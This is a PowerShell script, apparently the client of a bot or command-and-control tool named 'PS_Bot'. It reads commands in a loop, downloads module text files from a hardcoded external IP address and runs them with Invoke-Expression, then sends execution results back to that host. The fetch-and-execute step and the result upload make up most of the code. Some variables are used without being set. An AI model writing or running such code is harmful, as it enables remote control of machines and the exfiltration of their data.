﻿$condicon = $true
$ip = "35.165.190.126:80"
while($condicon){
 $command = Read-Host "local$>"
 $command = $command.split("|")
 $command
 $result = $true
 if ($result -eq $true){
   if($command[0] -eq "load"){
        if($commandlist -notcontains $command[1]){
            $uri="http://"
            $uri+=$ip;$uri+="/PS_Bot/";
            $uri+=$command[1];
            $uri+=".txt"
            $uri
            Invoke-WebRequest $uri  -usebasicparsing | Invoke-Expression
            $commandlist+=$command[1]
        }
        if($command[2]){
            $comando = $command[1];$comando += " ";$comando+=$command[2]
            $comando | Invoke-Expression
        }
        else
        {
            $comando = $command[1]
            $comando | Invoke-Expression
        }
        $execute
        $execute.Length
        if($execute.Length -gt 0){
            send-results -file $command[1] -ip $ip -execution $execute
        }
        $condition -ne "quit!"
   }
 }

}